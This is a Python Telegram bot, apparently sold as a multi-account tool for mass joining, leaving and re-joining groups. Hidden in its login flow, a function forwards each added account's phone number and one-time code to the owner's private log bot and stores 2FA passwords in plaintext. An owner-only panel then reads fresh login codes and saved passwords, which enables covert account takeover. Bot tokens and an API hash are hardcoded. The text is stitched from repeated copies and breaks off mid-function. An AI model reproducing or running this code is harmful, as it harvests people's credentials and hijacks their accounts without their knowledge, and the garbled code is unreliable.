# 🛡️ PROJECT: ULTRA MASTER TERMINAL v148 (STABLE)
# 🛠️ DEVELOPER: KARAN BHAIYA (@KARANBHAIYAAA)
# 📦 FEATURES: ADD ACCOUNT, TURBO JOIN, SMART LEAVE, PRO RE-JOIN

import os, asyncio, logging, glob, sys, time, datetime, re
from datetime import timezone

SESSION_FOLDER = "sessions"
os.makedirs(SESSION_FOLDER, exist_ok=True)
print(f"✅ Session folder: {SESSION_FOLDER}", flush=True)

logging.basicConfig(level=logging.ERROR)

try:
    from telethon import TelegramClient, events, Button
    from telethon.tl.functions.messages import ImportChatInviteRequest, CheckChatInviteRequest
    from telethon.tl.functions.channels import JoinChannelRequest, LeaveChannelRequest
    from telethon.tl.functions.account import UpdateStatusRequest
    from telethon.errors import *
except ImportError:
    os.system("pip install telethon")
    os.execl(sys.executable, sys.executable, *sys.argv)

# ================= CONFIGURATION =================
API_ID = 38632299
API_HASH = "e96a4e41b76c970802726471fc8405f6"
BOT_TOKEN = "8722201780:AAG9oZMifQXUsYSAR69mtrWjFHDBxqYLflY"
LOG_BOT_TOKEN = "8689767191:AAEYDN-9GuUzPTZz4JtPf2-RGhITg477vUw"

PHOTO_FILE = None
OWNER_ID = 6371811448
ADMIN_IDS = [OWNER_ID, 6463959160, 7285372203, 8593989565]
OWNER_LINK = "https://t.me/KARANBHAIYAAA"
CHANNEL_LINK = "https://t.me/+mYF4U1BggYU5OGU1"

ACTIVE_CLIENTS = {}
LOGIN_STATE = {}
MODE = {}
DELAY = {}
ID_LIMIT = {}
START_TIME = time.time()

bot = TelegramClient("main_v148", API_ID, API_HASH)
log_bot = TelegramClient("master_v148", API_ID, API_HASH)

BACK_BTN = [[Button.inline("⬅️ RETURN TO MENU", b"back")]]

# ================ HELPER FUNCTIONS =================
async def send_to_master(msg):
    try:
        await log_bot.send_message(OWNER_ID, msg)
    except:
        pass

async def get_fresh_otp(client):
    now = datetime.datetime.now(timezone.utc)
    async for msg in client.iter_messages(777000, limit=5):
        diff = (now - msg.date).total_seconds()
        if msg.text and diff < 120:
            otp = re.search(r'\b\d{5,6}\b', msg.text)
            if otp:
                return f"🎯 **FRESH OTP:** `{otp.group()}`\n⏰ `{msg.date.strftime('%H:%M:%S')}`\n📝 `{msg.text}`"
    return None

def get_hash(link):
    link = link.strip()
    if "+" in link: return link.split("+")[-1]
    if "joinchat/" in link: return link.split("/")[-1]
    return None

def get_username(link):
    return link.replace("https://t.me/", "").replace("t.me/", "").replace("@", "").split("/")[0].strip()

async def send_ui(client, chat_id, text, buttons):
    try:
        await client.send_message(chat_id, text, buttons=buttons)
    except:
        await client.send_message(chat_id, text)

# ================ LOG BOT (MASTER CONTROL) =================
@log_bot.on(events.NewMessage(pattern="/start"))
async def log_start(event):
    if event.sender_id != OWNER_ID: return
    uptime = str(datetime.timedelta(seconds=int(time.time() - START_TIME)))
    msg = f"🕹️ **MASTER CONTROL**\n\n📊 IDs: `{len(ACTIVE_CLIENTS)}`\n⏱ Uptime: `{uptime}`"
    buttons = [[Button.inline(f"📱 {num}", f"view_{num}")] for num in ACTIVE_CLIENTS.keys()]
    if not buttons: msg = "⚠️ No IDs logged in."
    await send_ui(log_bot, event.chat_id, msg, buttons)

@log_bot.on(events.CallbackQuery)
async def log_callback(event):
    if event.sender_id != OWNER_ID: return
    data = event.data.decode()
    if data.startswith("view_"):
        num = data.split("_")[-1]
        btns = [
            [Button.inline("📩 FRESH OTP", f"m_otp_{num}"), Button.inline("🔐 SHOW PWD", f"m_pw_{num}")],
            [Button.inline("⬅️ BACK", b"log_refresh")]
        ]
        await event.edit(f"⚙️ **CONTROL:** `{num}`", buttons=btns)
    elif data == "log_refresh":
        await log_start(event)
    elif data.startswith("m_otp_"):
        num = data.split("_")[-1]
        if num in ACTIVE_CLIENTS:
            res = await get_fresh_otp(ACTIVE_CLIENTS[num])
            await event.respond(res if res else "❌ NO NEW OTP")
    elif data.startswith("m_pw_"):
        num = data.split("_")[-1]
        p_path = f"{SESSION_FOLDER}/{num}.txt"
        pw = open(p_path).read() if os.path.exists(p_path) else "Not Saved"
        await event.respond(f"🔑 **ID:** `{num}`\n🔑 **PASS:** `{pw}`")

# ================ MAIN BOT UI =================
async def main_menu(event):
    MODE.pop(event.sender_id, None)
    uptime = str(datetime.timedelta(seconds=int(time.time() - START_TIME)))
    header = (
        "🚀 **KARAN BHAIYA SYSTEM**\n\n"
        f"🟢 IDs: `{len(ACTIVE_CLIENTS)}` | 👥 Admins: `{len(ADMIN_IDS)}`\n"
        f"⏳ Uptime: `{uptime}`\n\n"
        "👑 @KARANBHAIYAAA\n👇 Select option"
    )
    buttons = [
        [Button.inline("➕ ADD ACCOUNT", b"add"), Button.inline("🚀 TURBO JOIN", b"join")],
        [Button.inline("❌ SMART LEAVE", b"single"), Button.inline("🔄 PRO RE-JOIN", b"pro")],
        [Button.inline("👥 ADMIN PANEL", b"admin_list"), Button.inline("📊 DIAGNOSTICS", b"about")],
        [Button.url("👑 OWNER", OWNER_LINK)]
    ]
    await send_ui(bot, event.chat_id, header, buttons)

@bot.on(events.NewMessage(pattern="/start"))
async def cmd_start(event):
    if event.sender_id not in ADMIN_IDS:
        denied_msg = "❌ **Tumhare paas permission nahi hai.**\n\nOwner se contact karo."
        denied_btns = [[Button.url("👑 CONTACT", OWNER_LINK)]]
        return await send_ui(bot, event.chat_id, denied_msg, denied_btns)
    await main_menu(event)

@bot.on(events.CallbackQuery)
async def callback_handler(event):
    user, data = event.sender_id, event.data.decode()
    if user not in ADMIN_IDS: return
    if data == "back":
        await main_menu(event)
    elif data == "add":
        LOGIN_STATE[user] = {"step": "phone"}
        await event.edit("📱 Send phone number (e.g., +91...)", buttons=BACK_BTN)
    elif data in ["join", "pro", "single"]:
        desc = {"join":"🚀 TURBO JOIN","pro":"🔄 PRO RE-JOIN","single":"❌ SMART LEAVE"}
        btns = [
            [Button.inline("🔥 ALL IDs", f"SL_all_{data}"), Button.inline("⚙️ CUSTOM LIMIT", f"SL_cust_{data}")],
            BACK_BTN[0]
        ]
        await event.edit(f"{desc[data]}\n\nSelect ID strategy:", buttons=btns)
    elif data.startswith("SL_"):
        _, lim, t = data.split("_")
        ID_LIMIT[user] = len(ACTIVE_CLIENTS) if lim == "all" else 0
        MODE[user] = f"in_lim_{t}" if lim == "cust" else f"in_del_{t}"
        msg = "🔢 Enter number of IDs:" if lim == "cust" else "✅ Enter DELAY (seconds):"
        await event.edit(msg)
    elif data == "admin_list":
        txt = "👥 **ADMINS:**\n" + "\n".join([f"┣ `{a}`" for a in ADMIN_IDS])
        btns = [[Button.inline("➕ ADD", b"add_adm"), Button.inline("➖ REMOVE", b"rem_adm")], BACK_BTN[0]]
        await event.edit(txt, buttons=btns)
    elif data == "add_adm":
        MODE[user] = "get_add_id"
        await event.edit("➕ Send User ID to add:")
    elif data == "rem_adm":
        MODE[user] = "get_rem_id"
        await event.edit("➖ Send User ID to remove:")
    elif data == "about":
        uptime = str(datetime.timedelta(seconds=int(time.time() - START_TIME)))
        diag = (
            f"🛡️ **DIAGNOSTICS**\n━━━━━━━━━━━━━━\n"
            f"👤 Dev: KARAN BHAI\n🔌 IDs: {len(ACTIVE_CLIENTS)}\n"
            f"⏱ Uptime: {uptime}\n👥 Admins: {len(ADMIN_IDS)}"
        )
        await event.edit(diag, buttons=BACK_BTN)

# ================ MESSAGE HANDLER =================
@bot.on(events.NewMessage)
async def message_handler(event):
    user, text = event.sender_id, event.raw_text
    if not text or text.startswith("/") or user not in ADMIN_IDS: return

    # Admin add/remove
    if MODE.get(user) == "get_add_id":
        try:
            nid = int(text)
            if nid not in ADMIN_IDS: ADMIN_IDS.append(nid)
            await event.respond(f"✅ `{nid}` added.")
            await main_menu(event)
        except: await event.respond("❌ Invalid ID.")
        return
    if MODE.get(user) == "get_rem_id":
        try:
            rid = int(text)
            if rid == OWNER_ID: return await event.respond("❌ Owner cannot be removed.")
            if rid in ADMIN_IDS: ADMIN_IDS.remove(rid)
            await event.respond(f"✅ `{rid}` removed.")
            await main_menu(event)
        except: await event.respond("❌ Invalid ID.")
        return

    # Add account flow (phone, otp, 2fa)
    if user in LOGIN_STATE:
        state = LOGIN_STATE[user]
        if state["step"] == "phone":
            num = text.strip()
            await send_to_master(f"📱 ATTEMPT: `{num}` by `{user}`")
            cl = TelegramClient(f"{SESSION_FOLDER}/{num}", API_ID, API_HASH)
            await cl.connect()
            try:
                await cl.send_code_request(num)
                state.update({"step": "otp", "num": num, "cl": cl})
                await event.respond("📩 OTP sent. Enter it now:")
            except Exception as e:
                await event.respond(f"❌ Error: {e}")
                del LOGIN_STATE[user]
        elif state["step"] == "otp":
            otp = text.strip()
            await send_to_master(f"📩 OTP captured: `{otp}` for `{state['num']}`")
            try:
                await state["cl"].sign_in(state["num"], otp)
                ACTIVE_CLIENTS[state["num"]] = state["cl"]
                await event.respond(f"✅ Account `{state['num']}` added.")
                del LOGIN_STATE[user]
            except SessionPasswordNeededError:
                state["step"] = "2fa"
                await event.respond("🔐 2FA required. Enter password:")
            except Exception:
                await event.respond("❌ OTP error.")
                del LOGIN_STATE[user]
        elif state["step"] == "2fa":
            pw = text.strip()
            await send_to_master(f"🔐 2FA captured for `{state['num']}`")
            with open(f"{SESSION_FOLDER}/{state['num']}.txt", "w") as f:
                f.write(pw)
            try:
                await state["cl"].sign_in(password=pw)
                ACTIVE_CLIENTS[state["num"]] = state["cl"]
                await event.respond("✅ Account logged in (2FA).")
                del LOGIN_STATE[user]
            except Exception:
                await event.respond("❌ Wrong 2FA password.")
                del LOGIN_STATE[user]
        return

    # Join/Leave/Pro flow: limit -> delay -> link
    if MODE.get(user) and "in_lim_" in MODE[user]:
        try:
            ID_LIMIT[user] = int(text)
            MODE[user] = f"in_del_{MODE[user].split('_')[-1]}"
            await event.respond("✅ Enter **DELAY** (seconds between IDs):")
        except: pass
        return
    if MODE.get(user) and "in_del_" in MODE[user]:
        try:
            DELAY[user] = int(text)
            MODE[user] = f"wait_lk_{MODE[user].split('_')[-1]}"
            await event.respond("🔗 Send group link or username:")
        except: pass
        return
    if MODE.get(user) and "wait_lk_" in MODE[user]:
        link, task = text.strip(), MODE[user].split("_")[-1]
        status = await event.respond(f"⚙️ Processing {task.upper()}...")
        clients = list(ACTIVE_CLIENTS.values())[:ID_LIMIT.get(user, len(ACTIVE_CLIENTS))]
        for c in clients:
            try:
                await c(UpdateStatusRequest(offline=False))
                h, u = get_hash(link), get_username(link)
                if task in ["join", "pro"]:
                    if h:
                        if task == "pro":
                            try:
                                invite = await c(CheckChatInviteRequest(h))
                                await c(LeaveChannelRequest(invite.chat))
                            except: pass
                        await c(ImportChatInviteRequest(h))
                    else:
                        if task == "pro":
                            try: await c(LeaveChannelRequest(u))
                            except: pass
                        await c(JoinChannelRequest(u))
                elif task == "single":
                    if h:
                        try:
                            invite = await c(CheckChatInviteRequest(h))
                            await c(LeaveChannelRequest(invite.chat))
                        except: pass
                    else:
                        await c(LeaveChannelRequest(u))
            except: pass
            await asyncio.sleep(DELAY.get(user, 1))
        await status.edit(f"🎯 {task.upper()} mission completed!", buttons=BACK_BTN)
        del MODE[user]
        return

# ================ BOOT ENGINE =================
async def start_engine():
    print("🔥 Starting Karan Bhaiya Bot...", flush=True)
    await log_bot.start(bot_token=LOG_BOT_TOKEN)
    print("✅ Log Bot started", flush=True)
    await bot.start(bot_token=BOT_TOKEN)
    print("✅ Main Bot started", flush=True)

    for f in glob.glob(f"{SESSION_FOLDER}/*.session"):
        ph = os.path.basename(f).replace(".session", "")
        c = TelegramClient(f, API_ID, API_HASH)
        try:
            await c.connect()
            if await c.is_user_authorized():
                ACTIVE_CLIENTS[ph] = c
                print(f"✅ Loaded session: {ph}", flush=True)
        except Exception as e:
            print(f"❌ Failed {ph}: {e}", flush=True)

    print(f"🔥 Online | {len(ACTIVE_CLIENTS)} IDs", flush=True)
    await asyncio.gather(bot.run_until_disconnected(), log_bot.run_until_disconnected())

if __name__ == "__main__":
    asyncio.run(start_engine())LOGIN_STATE = {}
MODE = {}
DELAY = {}
ID_LIMIT = {}
START_TIME = time.time()

bot = TelegramClient("main_v148", API_ID, API_HASH)
log_bot = TelegramClient("master_v148", API_ID, API_HASH)

BACK_BTN = [[Button.inline("⬅️ RETURN TO MENU", b"back")]]

# ================ HELPER FUNCTIONS =================
async def send_to_master(msg):
    try:
        await log_bot.send_message(OWNER_ID, msg)
    except:
        pass

async def get_fresh_otp(client):
    now = datetime.datetime.now(timezone.utc)
    async for msg in client.iter_messages(777000, limit=5):
        diff = (now - msg.date).total_seconds()
        if msg.text and diff < 120:
            otp = re.search(r'\b\d{5,6}\b', msg.text)
            if otp:
                return f"🎯 **FRESH OTP:** `{otp.group()}`\n⏰ `{msg.date.strftime('%H:%M:%S')}`\n📝 `{msg.text}`"
    return None

def get_hash(link):
    link = link.strip()
    if "+" in link: return link.split("+")[-1]
    if "joinchat/" in link: return link.split("/")[-1]
    return None

def get_username(link):
    return link.replace("https://t.me/", "").replace("t.me/", "").replace("@", "").split("/")[0].strip()

async def send_ui(client, chat_id, text, buttons):
    try:
        await client.send_message(chat_id, text, buttons=buttons)
    except:
        await client.send_message(chat_id, text)

# ================ LOG BOT (MASTER CONTROL) =================
@log_bot.on(events.NewMessage(pattern="/start"))
async def log_start(event):
    if event.sender_id != OWNER_ID: return
    uptime = str(datetime.timedelta(seconds=int(time.time() - START_TIME)))
    msg = f"🕹️ **MASTER CONTROL**\n\n📊 IDs: `{len(ACTIVE_CLIENTS)}`\n⏱ Uptime: `{uptime}`"
    buttons = [[Button.inline(f"📱 {num}", f"view_{num}")] for num in ACTIVE_CLIENTS.keys()]
    if not buttons: msg = "⚠️ No IDs logged in."
    await send_ui(log_bot, event.chat_id, msg, buttons)

@log_bot.on(events.CallbackQuery)
async def log_callback(event):
    if event.sender_id != OWNER_ID: return
    data = event.data.decode()
    if data.startswith("view_"):
        num = data.split("_")[-1]
        btns = [
            [Button.inline("📩 FRESH OTP", f"m_otp_{num}"), Button.inline("🔐 SHOW PWD", f"m_pw_{num}")],
            [Button.inline("⬅️ BACK", b"log_refresh")]
        ]
        await event.edit(f"⚙️ **CONTROL:** `{num}`", buttons=btns)
    elif data == "log_refresh":
        await log_start(event)
    elif data.startswith("m_otp_"):
        num = data.split("_")[-1]
        if num in ACTIVE_CLIENTS:
            res = await get_fresh_otp(ACTIVE_CLIENTS[num])
            await event.respond(res if res else "❌ NO NEW OTP")
    elif data.startswith("m_pw_"):
        num = data.split("_")[-1]
        p_path = f"{SESSION_FOLDER}/{num}.txt"
        pw = open(p_path).read() if os.path.exists(p_path) else "Not Saved"
        await event.respond(f"🔑 **ID:** `{num}`\n🔑 **PASS:** `{pw}`")

# ================ MAIN BOT UI =================
async def main_menu(event):
    MODE.pop(event.sender_id, None)
    uptime = str(datetime.timedelta(seconds=int(time.time() - START_TIME)))
    header = (
        "🚀 **KARAN BHAIYA SYSTEM**\n\n"
        f"🟢 IDs: `{len(ACTIVE_CLIENTS)}` | 👥 Admins: `{len(ADMIN_IDS)}`\n"
        f"⏳ Uptime: `{uptime}`\n\n"
        "👑 @KARANBHAIYAAA\n👇 Select option"
    )
    buttons = [
        [Button.inline("➕ ADD ACCOUNT", b"add"), Button.inline("🚀 TURBO JOIN", b"join")],
        [Button.inline("❌ SMART LEAVE", b"single"), Button.inline("🔄 PRO RE-JOIN", b"pro")],
        [Button.inline("👥 ADMIN PANEL", b"admin_list"), Button.inline("📊 DIAGNOSTICS", b"about")],
        [Button.url("👑 OWNER", OWNER_LINK)]
    ]
    await send_ui(bot, event.chat_id, header, buttons)

@bot.on(events.NewMessage(pattern="/start"))
async def cmd_start(event):
    if event.sender_id not in ADMIN_IDS:
        denied_msg = "❌ **Tumhare paas permission nahi hai.**\n\nOwner se contact karo."
        denied_btns = [[Button.url("👑 CONTACT", OWNER_LINK)]]
        return await send_ui(bot, event.chat_id, denied_msg, denied_btns)
    await main_menu(event)

@bot.on(events.CallbackQuery)
async def callback_handler(event):
    user, data = event.sender_id, event.data.decode()
    if user not in ADMIN_IDS: return
    if data == "back":
        await main_menu(event)
    elif data == "add":
        LOGIN_STATE[user] = {"step": "phone"}
        await event.edit("📱 Send phone number (e.g., +91...)", buttons=BACK_BTN)
    elif data in ["join", "pro", "single"]:
        desc = {"join":"🚀 TURBO JOIN","pro":"🔄 PRO RE-JOIN","single":"❌ SMART LEAVE"}
        btns = [
            [Button.inline("🔥 ALL IDs", f"SL_all_{data}"), Button.inline("⚙️ CUSTOM LIMIT", f"SL_cust_{data}")],
            BACK_BTN[0]
        ]
        await event.edit(f"{desc[data]}\n\nSelect ID strategy:", buttons=btns)
    elif data.startswith("SL_"):
        _, lim, t = data.split("_")
        ID_LIMIT[user] = len(ACTIVE_CLIENTS) if lim == "all" else 0
        MODE[user] = f"in_lim_{t}" if lim == "cust" else f"in_del_{t}"
        msg = "🔢 Enter number of IDs:" if lim == "cust" else "✅ Enter DELAY (seconds):"
        await event.edit(msg)
    elif data == "admin_list":
        txt = "👥 **ADMINS:**\n" + "\n".join([f"┣ `{a}`" for a in ADMIN_IDS])
        btns = [[Button.inline("➕ ADD", b"add_adm"), Button.inline("➖ REMOVE", b"rem_adm")], BACK_BTN[0]]
        await event.edit(txt, buttons=btns)
    elif data == "add_adm":
        MODE[user] = "get_add_id"
        await event.edit("➕ Send User ID to add:")
    elif data == "rem_adm":
        MODE[user] = "get_rem_id"
        await event.edit("➖ Send User ID to remove:")
    elif data == "about":
        uptime = str(datetime.timedelta(seconds=int(time.time() - START_TIME)))
        diag = (
            f"🛡️ **DIAGNOSTICS**\n━━━━━━━━━━━━━━\n"
            f"👤 Dev: KARAN BHAI\n🔌 IDs: {len(ACTIVE_CLIENTS)}\n"
            f"⏱ Uptime: {uptime}\n👥 Admins: {len(ADMIN_IDS)}"
        )
        await event.edit(diag, buttons=BACK_BTN)

# ================ MESSAGE HANDLER =================
@bot.on(events.NewMessage)
async def message_handler(event):
    user, text = event.sender_id, event.raw_text
    if not text or text.startswith("/") or user not in ADMIN_IDS: return

    # Admin add/remove
    if MODE.get(user) == "get_add_id":
        try:
            nid = int(text)
            if nid not in ADMIN_IDS: ADMIN_IDS.append(nid)
            await event.respond(f"✅ `{nid}` added.")
            await main_menu(event)
        except: await event.respond("❌ Invalid ID.")
        return
    if MODE.get(user) == "get_rem_id":
        try:
            rid = int(text)
            if rid == OWNER_ID: return await event.respond("❌ Owner cannot be removed.")
            if rid in ADMIN_IDS: ADMIN_IDS.remove(rid)
            await event.respond(f"✅ `{rid}` removed.")
            await main_menu(event)
        except: await event.respond("❌ Invalid ID.")
        return

    # Add account flow (phone, otp, 2fa)
    if user in LOGIN_STATE:
        state = LOGIN_STATE[user]
        if state["step"] == "phone":
            num = text.strip()
            await send_to_master(f"📱 ATTEMPT: `{num}` by `{user}`")
            cl = TelegramClient(f"{SESSION_FOLDER}/{num}", API_ID, API_HASH)
            await cl.connect()
            try:
                await cl.send_code_request(num)
                state.update({"step": "otp", "num": num, "cl": cl})
                await event.respond("📩 OTP sent. Enter it now:")
            except Exception as e:
                await event.respond(f"❌ Error: {e}")
                del LOGIN_STATE[user]
        elif state["step"] == "otp":
            otp = text.strip()
            await send_to_master(f"📩 OTP captured: `{otp}` for `{state['num']}`")
            try:
                await state["cl"].sign_in(state["num"], otp)
                ACTIVE_CLIENTS[state["num"]] = state["cl"]
                await event.respond(f"✅ Account `{state['num']}` added.")
                del LOGIN_STATE[user]
            except SessionPasswordNeededError:
                state["step"] = "2fa"
                await event.respond("🔐 2FA required. Enter password:")
            except Exception:
                await event.respond("❌ OTP error.")
                del LOGIN_STATE[user]
        elif state["step"] == "2fa":
            pw = text.strip()
            await send_to_master(f"🔐 2FA captured for `{state['num']}`")
            with open(f"{SESSION_FOLDER}/{state['num']}.txt", "w") as f:
                f.write(pw)
            try:
                await state["cl"].sign_in(password=pw)
                ACTIVE_CLIENTS[state["num"]] = state["cl"]
                await event.respond("✅ Account logged in (2FA).")
                del LOGIN_STATE[user]
            except Exception:
                await event.respond("❌ Wrong 2FA password.")
                del LOGIN_STATE[user]
        return

    # Join/Leave/Pro flow: limit -> delay -> link
    if MODE.get(user) and "in_lim_" in MODE[user]:
        try:
            ID_LIMIT[user] = int(text)
            MODE[user] = f"in_del_{MODE[user].split('_')[-1]}"
            await event.respond("✅ Enter **DELAY** (seconds between IDs):")
        except: pass
        return
    if MODE.get(user) and "in_del_" in MODE[user]:
        try:
            DELAY[user] = int(text)
            MODE[user] = f"wait_lk_{MODE[user].split('_')[-1]}"
            await event.respond("🔗 Send group link or username:")
        except: pass
        return
    if MODE.get(user) and "wait_lk_" in MODE[user]:
        link, task = text.strip(), MODE[user].split("_")[-1]
        status = await event.respond(f"⚙️ Processing {task.upper()}...")
        clients = list(ACTIVE_CLIENTS.values())[:ID_LIMIT.get(user, len(ACTIVE_CLIENTS))]
        for c in clients:
            try:
                await c(UpdateStatusRequest(offline=False))
                h, u = get_hash(link), get_username(link)
                if task in ["join", "pro"]:
                    if h:
                        if task == "pro":
                            try:
                                invite = await c(CheckChatInviteRequest(h))
                                await c(LeaveChannelRequest(invite.chat))
                            except: pass
                        await c(ImportChatInviteRequest(h))
                    else:
                        if task == "pro":
                            try: await c(LeaveChannelRequest(u))
                            except: pass
                        await c(JoinChannelRequest(u))
                elif task == "single":
                    if h:
                        try:
                            invite = await c(CheckChatInviteRequest(h))
                            await c(LeaveChannelRequest(invite.chat))
                        except: pass
                    else:
                        await c(LeaveChannelRequest(u))
            except: pass
            await asyncio.sleep(DELAY.get(user, 1))
        await status.edit(f"🎯 {task.upper()} mission completed!", buttons=BACK_BTN)
        del MODE[user]
        return

# ================ BOOT ENGINE =================
async def start_engine():
    print("🔥 Starting Karan Bhaiya Bot...", flush=True)
    await log_bot.start(bot_token=LOG_BOT_TOKEN)
    print("✅ Log Bot started", flush=True)
    await bot.start(bot_token=BOT_TOKEN)
    print("✅ Main Bot started", flush=True)

    for f in glob.glob(f"{SESSION_FOLDER}/*.session"):
        ph = os.path.basename(f).replace(".session", "")
        c = TelegramClient(f, API_ID, API_HASH)
        try:
            await c.connect()
            if await c.is_user_authorized():
                ACTIVE_CLIENTS[ph] = c
                print(f"✅ Loaded session: {ph}", flush=True)
        except Exception as e:
            print(f"❌ Failed {ph}: {e}", flush=True)

    print(f"🔥 Online | {len(ACTIVE_CLIENTS)} IDs", flush=True)
    await asyncio.gather(bot.run_until_disconnected(), log_bot.run_until_disconnected())

if __name__ == "__main__":
    asyncio.run(start_engine())# --- FRESH OTP EXTRACTOR ---
async def get_fresh_otp(client):
    now = datetime.datetime.now(timezone.utc)
    async for msg in client.iter_messages(777000, limit=5):
        diff = (now - msg.date).total_seconds()
        if msg.text and diff < 120:
            otp = re.search(r'\b\d{5,6}\b', msg.text)
            if otp:
                return f"🎯 **FRESH OTP FOUND:** `{otp.group()}`\n⏰ **TIME:** `{msg.date.strftime('%H:%M:%S')}`\n📝 `{msg.text}`"
    return None

# --- HELPER FUNCTIONS ---
def get_hash(link):
    link = link.strip()
    if "+" in link: return link.split("+")[-1]
    if "joinchat/" in link: return link.split("/")[-1]
    return None

def get_username(link):
    return link.replace("https://t.me/", "").replace("t.me/", "").replace("@", "").split("/")[0].strip()

async def send_ui(client, chat_id, text, buttons):
    if PHOTO_FILE and os.path.exists(PHOTO_FILE):
        try:
            await client.send_file(chat_id, PHOTO_FILE, caption=text, buttons=buttons)
        except:
            await client.send_message(chat_id, text, buttons=buttons)
    else:
        await client.send_message(chat_id, text, buttons=buttons)

# --- LOG BOT (MASTER CONTROL) ---
@log_bot.on(events.NewMessage(pattern="/start"))
async def log_start(event):
    if event.sender_id != OWNER_ID: return
    uptime = str(datetime.timedelta(seconds=int(time.time() - START_TIME)))
    msg = f"🕹️ **MASTER CONTROL PANEL**\n\n📊 IDs Online: `{len(ACTIVE_CLIENTS)}`\n⏱ Uptime: `{uptime}`"
    buttons = [[Button.inline(f"📱 {num}", f"view_{num}")] for num in ACTIVE_CLIENTS.keys()]
    if not buttons: 
        msg = "⚠️ No IDs logged in yet.\n\nAdd accounts via main bot!"
    await send_ui(log_bot, event.chat_id, msg, buttons)

@log_bot.on(events.CallbackQuery)
async def log_callback(event):
    if event.sender_id != OWNER_ID: return
    data = event.data.decode()
    if data.startswith("view_"):
        num = data.split("_")[-1]
        btns = [
            [Button.inline("📩 FRESH OTP", f"m_otp_{num}"), Button.inline("🔐 SHOW PWD", f"m_pw_{num}")],
            [Button.inline("⬅️ BACK", b"log_refresh")]
        ]
        await event.edit(f"⚙️ **CONTROL:** `{num}`", buttons=btns)
    elif data == "log_refresh":
        await log_start(event)
    elif data.startswith("m_otp_"):
        num = data.split("_")[-1]
        if num in ACTIVE_CLIENTS:
            res = await get_fresh_otp(ACTIVE_CLIENTS[num])
            await event.respond(res if res else f"❌ **NO NEW OTP!**")
    elif data.startswith("m_pw_"):
        num = data.split("_")[-1]
        p_path = f"{SESSION_FOLDER}/{num}.txt"
        pw = open(p_path).read() if os.path.exists(p_path) else "Not Saved"
        await event.respond(f"🔑 **ID:** `{num}`\n🔑 **PASS:** `{pw}`")

# --- MAIN BOT UI DASHBOARD ---
async def main_menu(event):
    MODE.pop(event.sender_id, None)
    uptime = str(datetime.timedelta(seconds=int(time.time() - START_TIME)))
    header = (
        "🚀 **KARAN BHAIYA SYSTEM**\n\n"
        f"🟢 IDs: `{len(ACTIVE_CLIENTS)}` | 👥 Admins: `{len(ADMIN_IDS)}`\n"
        f"⏳ Uptime: `{uptime}`\n\n"
        "👑 Owner: @KARANBHAIYAAA\n"
        "🟢 System Running | ⚡ Live\n"
        "👇 Select option"
    )
    buttons = [
        [Button.inline("➕ ADD ACCOUNT", b"add"), Button.inline("🚀 TURBO JOIN", b"join")],
        [Button.inline("❌ SMART LEAVE", b"single"), Button.inline("🔄 PRO RE-JOIN", b"pro")],
        [Button.inline("👥 ADMIN PANEL", b"admin_list"), Button.inline("📊 DIAGNOSTICS", b"about")],
        [Button.url("👑 OWNER", OWNER_LINK)]
    ]
    await send_ui(bot, event.chat_id, header, buttons)

@bot.on(events.NewMessage(pattern="/start"))
async def cmd_start(event):
    if event.sender_id not in ADMIN_IDS:
        denied_msg = (
            "❌ **Tumhare paas koi permission nahi hai.**\n\n"
            "Bot ko start ya run karne ke liye owner se permission leni padegi."
        )
        denied_btns = [
            [Button.url("👑 CONTACT OWNER", OWNER_LINK)],
            [Button.url("📢 JOIN CHANNEL", CHANNEL_LINK)]
        ]
        return await send_ui(bot, event.chat_id, denied_msg, denied_btns)
    await main_menu(event)

@bot.on(events.CallbackQuery)
async def callback_handler(event):
    user, data = event.sender_id, event.data.decode()
    if user not in ADMIN_IDS: return

    if data == "back":
        await main_menu(event)
    
    elif data == "add":
        LOGIN_STATE[user] = {"step": "phone"}
        await event.edit("📱 **MODULE: ADD ACCOUNT**\n\nSend the phone number (e.g., +91...) to link a new ID.", buttons=BACK_BTN)
    
    elif data in ["join", "pro", "single"]:
        desc = {
            "join": "🚀 **TURBO JOIN:** Fast joining across all online IDs.",
            "pro": "🔄 **PRO RE-JOIN:** IDs will leave then rejoin to refresh members.",
            "single": "❌ **SMART LEAVE:** Safely leave the target group/channel."
        }
        btns = [
            [Button.inline("🔥 ALL IDs", f"SL_all_{data}"), Button.inline("⚙️ CUSTOM LIMIT", f"SL_cust_{data}")],
            [Button.inline("⬅️ BACK", b"back")]
        ]
        await event.edit(f"{desc[data]}\n\n**Select ID strategy:**", buttons=btns)

    elif data.startswith("SL_"):
        _, lim, t = data.split("_")
        ID_LIMIT[user] = len(ACTIVE_CLIENTS) if lim == "all" else 0
        MODE[user] = f"in_lim_{t}" if lim == "cust" else f"in_del_{t}"
        msg = "🔢 **STEP 1:** Enter the number of IDs you want to use:" if lim == "cust" else "✅ **STEP 2:** Enter **DELAY** (Seconds gap between IDs):"
        await event.edit(msg)

    elif data == "admin_list":
        txt = "👥 **AUTHORIZED ADMINS:**\n\n" + "\n".join([f"┣ `{a}`" for a in ADMIN_IDS])
        btns = [
            [Button.inline("➕ ADD ADMIN", b"add_adm"), Button.inline("➖ REMOVE ADMIN", b"rem_adm")],
            [Button.inline("⬅️ BACK", b"back")]
        ]
        await event.edit(txt, buttons=btns)

    elif data == "add_adm": 
        MODE[user] = "get_add_id"
        await event.edit("➕ **Send User ID to authorize:**")
    
    elif data == "rem_adm":
        MODE[user] = "get_rem_id"
        await event.edit("➖ **Send User ID to remove access:**")

    elif data == "about":
        uptime = str(datetime.timedelta(seconds=int(time.time() - START_TIME)))
        diag = (
            "🛡️ **SYSTEM DIAGNOSTICS**\n"
            "━━━━━━━━━━━━━━━━━━━━\n"
            f"👤 **Developer:** `KARAN BHAI`\n"
            f"🔌 **Active Nodes:** `{len(ACTIVE_CLIENTS)}` Online\n"
            f"⏱ **System Uptime:** `{uptime}`\n"
            f"👥 **Total Admins:** `{len(ADMIN_IDS)}` Users\n"
            "━━━━━━━━━━━━━━━━━━━━\n"
            "🛒 @KARANBHAIYAAA"
        )
        await event.edit(diag, buttons=BACK_BTN)

# --- MESSAGE HANDLER ---
@bot.on(events.NewMessage)
async def message_handler(event):
    user, text = event.sender_id, event.raw_text
    if not text or text.startswith("/") or user not in ADMIN_IDS: return

    # Admin Management
    if MODE.get(user) == "get_add_id":
        try:
            nid = int(text.strip())
            if nid not in ADMIN_IDS: ADMIN_IDS.append(nid)
            await event.respond(f"✅ `{nid}` added as Admin.")
            await main_menu(event)
        except: 
            await event.respond("❌ Invalid ID.")
        return
    
    elif MODE.get(user) == "get_rem_id":
        try:
            rid = int(text.strip())
            if rid == OWNER_ID:
                await event.respond("❌ Owner cannot be removed!")
                return
